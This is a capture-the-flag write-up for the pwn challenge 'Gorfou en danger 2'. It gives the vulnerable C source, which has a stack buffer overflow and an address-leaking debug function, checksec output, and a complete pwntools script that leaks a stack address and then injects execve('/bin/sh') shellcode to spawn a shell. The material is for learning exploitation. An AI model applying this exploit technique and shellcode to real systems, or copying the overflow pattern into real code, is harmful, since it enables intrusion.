---
layout: post
title: Gorfou en danger 2
date: 06/06/2025
categories: [ctf, pwn]
tag: [pwn, ctf]
author: Paw
description: wu for the Gorfou en danger 2
---

```C
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int main(void);

void menu() {
    puts("      __                                                                       ");
    puts("     /\\ \\                                                                    ");
    puts("    /  \\ \\      >>========================================================<< ");
    puts("   / /\\ \\ \\     ||░█▀▄░█▀▀░█▀▀░█▀▀░░░█▀▀░█▀█░█▀█░█▀▀░█▀█░█░░░█▀▀░░░█░█░▀▀▄||");
    puts("  / / /\\ \\ \\    ||░█░█░█░█░▀▀█░█░█░░░█░░░█░█░█░█░▀▀█░█░█░█░░░█▀▀░░░▀▄▀░▄▀░||");
    puts(" / / /__\\_\\ \\   ||░▀▀░░▀▀▀░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀||");
    puts("/ / /________\\  >>========================================================<<  ");
    puts("\\/___________/                                                                ");
}

void debug_info(void) { 
    // our very own "info proc map"
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);
    return;
}

void take_command() {
    char command[0x100];
    
    printf("> ");
    read(0, command, 0x130);
    printf("Commande inconnue\n");
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    menu();

    printf("Terminal de contrôle à distance de la station orbilate Penrose\n");

    while (1) {
        take_command();
    }

    return 0;
}
```
In the challenge source code we can see a function called : `debug_info`

After a simple checksec we can see that NX protection is disable and there is no PIE :
```bash
    gorfou-en-danger-2 checksec --file=chall      
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   43 Symbols	 No	0		2		chall

```
An exploit model is given in the challenge. This model can generate shellcode, and it is not necessary to specify that this shellcode will be useful.

```C
void debug_info(void) { 
    // our very own "info proc map"
    printf("main address : %p\n", &main);
    printf("printf address : %p\n", *(uint64_t *)0x403008);
    void* local_var = NULL;
    printf("Stack address : %p\n", &local_var);
    return;
}
```

This function leak the stack adress. 

With the help of a little ret2win we will go to the `debug_info` function.

> we have already dealt with this subject

Sooo, we can stock the leak and then do a simple ret2shellcode

> : shellcode + some junk until the EIP/RIP adress + adress of the bottom of the stack 

wu: 
```python
from pwn import *

exe = ELF("./chall")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process("./chall")
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = process("./chall")
    return r

def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode


def main():
    r = conn()
    r.recvuntil(b"> ")
    debug_addr = p64(0x00000000004004ed)
    main_addr = p64(0x0000000000400584)
    sc = generate_shellcode()
    offset = 264
    p1 = b'a'*offset + debug_addr + main_addr 
    r.sendline(p1)
    leak = r.recv().split(b' : ')

    main = int(leak[1].split(b'\n')[0][2:], 16)
    printf = int(leak[2].split(b'\n')[0][2:], 16)
    stack = int(leak[3].split(b'\n')[0][2:], 16)

    print(f'main={hex(main)}')
    print(f'printf={hex(printf)}')
    print(f'stack={hex(stack)}')
    
    pay = sc
    pay += b'a' * (offset - len(sc))
    pay += p64(stack - 0x100)
    r.sendline(pay)
    r.interactive()

if __name__ == "__main__":
    main()

```
